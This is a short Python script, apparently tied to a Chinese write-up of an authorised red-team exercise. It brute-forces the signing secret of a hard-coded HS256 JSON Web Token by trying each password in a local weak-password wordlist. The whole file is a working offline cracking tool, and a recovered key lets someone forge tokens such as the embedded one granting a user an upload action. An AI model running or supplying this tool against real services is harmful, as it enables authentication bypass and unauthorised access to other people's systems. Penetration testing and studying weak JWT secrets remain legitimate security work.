import jwt
import termcolor

# paper《全程带阻：记一次授权网络攻防演练（上）》，https://www.freebuf.com/vuls/211842.html，more http://yangyangwithgnu.github.io/

jwt_str = R'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoibmFuYSIsImFjdGlvbiI6InVwbG9hZCJ9.56wwCrB9tIgmUnYpLPxkO8GYj1soCjuu_skTlbH_Gg8'

with open('D:\\工具\\字典\\弱口令\\top1000.txt') as f:
    for line in f:
        key_ = line.strip()
        try:
            jwt.decode(jwt_str, verify=True, key=key_)
            print('\r', '\bbingo! found key -->', termcolor.colored(key_, 'green'), '<--')
            break
        except (
        jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError,
        jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):
            print('\r', '\bbingo! found key -->', termcolor.colored(key_, 'green'), '<--')
            break
        except jwt.exceptions.InvalidSignatureError:
            print('\r', ' ' * 64, '\r\btry', key_, end='', flush=True)
            continue
    else:
        print('\r', '\bsorry! no key be found.')